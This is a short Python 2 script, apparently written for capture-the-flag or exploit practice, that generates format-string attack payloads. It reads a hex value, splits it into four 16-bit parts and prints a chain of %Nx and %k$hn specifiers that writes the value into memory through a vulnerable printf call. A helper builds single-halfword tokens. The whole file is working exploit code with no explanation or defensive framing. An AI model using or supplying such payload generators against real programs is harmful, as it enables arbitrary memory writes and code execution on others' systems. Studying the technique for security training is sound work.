def construct(offset,word,ExtraBytes):
	if word > ExtraBytes:
		token = "%" + str(word-ExtraBytes) + "x%" + str(offset) + "$hn"
	else:
		token = "%" + str(word + 0x10000 - ExtraBytes) + "x%" + str(offset) + "$hn"
	return token


token = int(raw_input("value to be written:"),16)

#split token into 4 short integers

token = [ token&0xffff , (token&0xffff0000)>>0x10 , (token&0xffff00000000)>>0x20 , (token&0xffff000000000000)>>0x30 ]

#create buffer with special key to write token address into 4 constituents

buff = "%" + str(token[0]) + "x%1$hn" + "%" + str(((0x10000 - token[0])%0x10000) + token[1]) + "x%2$hn" + "%" + str(((0x10000 - token[1])%0x10000) + token[2]) + "x%3$hn" + "%" + str(((0x10000 - token[2])%0x10000) + token[3]) + "x%4$hn"
print buff
